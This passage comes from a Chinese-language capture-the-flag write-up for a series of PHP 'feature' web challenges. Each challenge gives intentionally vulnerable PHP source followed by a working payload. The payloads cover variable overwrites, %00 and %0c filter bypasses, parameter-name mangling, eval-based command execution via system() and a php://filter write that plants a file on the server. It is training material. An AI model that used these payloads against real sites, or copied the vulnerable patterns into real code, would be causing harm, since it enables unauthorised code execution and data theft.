<p><strong>GET</strong><br>v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-<br>decode&#x2F;resource&#x3D;2.php<br><strong>POST</strong><br>v1&#x3D;hex2bin<br>#访问2.php后查看源代码获得flag</p>
</blockquote>
<p><a href="https://blog.csdn.net/m0_62094846/article/details/122497198">参考链接</a></p>
<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span>
<span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>foreach函数</code></p>
<blockquote>
<p>foreach 循环只适用于数组，并用于遍历数组中的每个键&#x2F;值对。<br><code>foreach ($array as $value)</code></p>
</blockquote>
<blockquote>
<p><code>die() 函数</code>输出一条消息，并退出当前脚本。</p>
</blockquote>
<p>每进行一次循环迭代，当前数组元素的值就会被赋值给 $value 变量，并且数组指针会逐一地移动，直到到达最后一个数组元素。<br>get传入一个值，把值赋给key，如果key&#x3D;&#x3D;=error输出”what are you doing?!“停止函数。否则把值赋给value<br>post传入一个值，把值赋给key，如果key&#x3D;&#x3D;=flag输出”what are you doing?!“停止函数。否则把值赋给value<br>如果post传入的flag与$flag相等。给我们flag<br>payload:</p>
<blockquote>
<p>GET:<br>?x&#x3D;flag<br>POST:<br>error&#x3D;x</p>
</blockquote>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>post方式传入v1，get方式传入v3。<br><code>parse_str(\$v1,\$v2);</code>将v1的内容当作v2的参数。<br><code> if($v2[&#39;flag&#39;]==md5($v3))&#123;</code>v2的flag参数的值值等于传入的v3传入参数的MD5加密后的值<br>payload：<br>GET：?v3&#x3D;2<br>POST：v1&#x3D;flag&#x3D;c81e728d9d4c2f636f067f89cc14862c<br>得到flag。<br><img src="https://img-blog.csdnimg.cn/0a7356866de6432faeb98ab83664f174.png" alt="1"></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token comment">//只有36d的人才能看到flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//0x36d=877</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>^是开始位置，$是结束位置。<br><code>if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;</code><br>在get传入参数中查看是否是a-zA-Z开头的，如果是返回true。要绕过第一个if语句，必须使为true。然后才能不执行die函数。<br><code>if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;</code>将传入的值倒置弱类型判断是否是整数877<br>payload：<code>?c=a%00778</code>(%00截断漏洞)<br><img src="https://img-blog.csdnimg.cn/3a66812e55b34ce78493c509e02c84fe.png" alt="2"></p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>v1和v2传入的值若含有字母则执行eval()函数。<br>payload：<code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>或<code>?v1=ReflectionClass&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>。得到flag。</p>
<blockquote>
<p><strong>?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(“cat fl36dg.txt”)</strong><br>这段代码的作用是使用PHP的反射机制来获取一个由执行”ls”命令的结果返回的类的信息，并将该信息输出到标准输出中。<br>具体地，这段代码使用了PHP的反射类ReflectionClass来获取由system(“ls”)命令执行返回的类的信息。其中，system(“ls”)执行了一个shell命令”ls”，并将其输出到标准输出。反射类ReflectionClass通过接收一个类名参数来获取该类的信息，这里的类名就是由”ls”命令返回的结果。</p>
</blockquote>
<blockquote>
<p><code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code><br>该命令使用PHP语言中的system()函数来执行ls命令，并将结果传递给Exception类的构造函数，然后将该异常实例传递给echo语句。<br>换句话说，该命令的意思是在PHP脚本中执行ls命令，将其结果作为参数传递给Exception类的构造函数，然后将这个异常对象输出到屏幕上。在这个过程中，如果ls命令执行出错，会抛出一个异常并显示在屏幕上。</p>
</blockquote>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>不愧是php特性，都没见过！！</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里新了解到一个php函数<br><strong>FilesystemIterator</strong>用来创建当前目录的迭代器。<br><strong>getcwd</strong>获取当前工作目录<br><img src="https://img-blog.csdnimg.cn/0f75cdbef7f64326b050074b58979d04.png" alt="1"><br>payload:<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br><img src="https://img-blog.csdnimg.cn/8c05431e2cff4c28863fa30926446d1a.png" alt="2"><br>访问文件得到flag。</p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2310602538cb43ab9e19ec98fe2c2ef2.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/270988a18f6d41919e68794c19bbb57b.png" alt="2"><br>好像没过滤<strong>\f</strong></p>
<p>payload：<br>GET：?num&#x3D;%0c36</p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$a</code>在本题中没用，需要传入CTF_SHOW，CTF_SHOW.COM并且不传入fl0g。<br>payload：<code>POST CTF_SHOW=1&amp;CTF_SHOW.COM=2&amp;fun=echo $flag</code>但是不成功，原来是把<code>.</code>给过滤掉了。这里了解到php的一个特性php标变量名只允许数字字母下划线，当post或get传入的时候，如果含有空格，+，[  则会转化为_，但是如果传入[  之后他会被转化为_，此时后面的字符就会被保留下来而不会被替换。<br>payload：<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p>
<h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用highlight_file()函数。<br>payload：<code>**GET** ?shell=flag.php  **POST**  CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[shell]) </code></p>
<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
